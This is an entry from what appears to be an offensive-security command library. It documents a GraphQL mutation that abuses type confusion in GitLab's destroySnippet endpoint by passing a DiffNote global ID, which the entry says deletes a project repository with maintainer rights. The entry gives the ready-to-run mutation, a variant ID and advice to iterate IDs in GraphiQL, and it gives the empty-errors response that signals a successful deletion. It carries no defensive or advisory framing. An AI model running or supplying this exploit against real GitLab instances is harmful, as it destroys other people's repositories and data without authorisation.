---
id: uuid-destroy-diffnote
data: >-
  mutation test { destroySnippet(input: {id: "gid://gitlab/DiffNote/118"}) {
  errors } }
tags:
  - graphql
  - deletion
type: command
output: null
executor: graphql
platforms:
  - Web
  - GitLab
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:53.146Z'
verified: false
validated: true
submitted: true
---
# destroy-snippet-mutation-diffnote

## Command

```graphql
mutation test { destroySnippet(input: {id: "gid://gitlab/DiffNote/118"}) { errors } }
```

## Description

GraphQL mutation exploiting type confusion in GitLab's destroySnippet by using a DiffNote global ID, leading to project repository deletion as a maintainer.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| id | Global ID of DiffNote (e.g., gid://gitlab/DiffNote/118) | Yes |

## Examples

### Basic Usage

```graphql
mutation test { destroySnippet(input: {id: "gid://gitlab/DiffNote/116"}) { errors } }
```

### Advanced Usage

Use in GraphiQL with incremental IDs post-extraction.

## Expected Output

{"data":{"destroySnippet":{"errors":[]}}}\nNo errors indicate successful deletion.

## Related

- [[commands/destroy-snippet-mutation-project]]
- [[procedures/Execute-DestroySnippet-Mutation]]
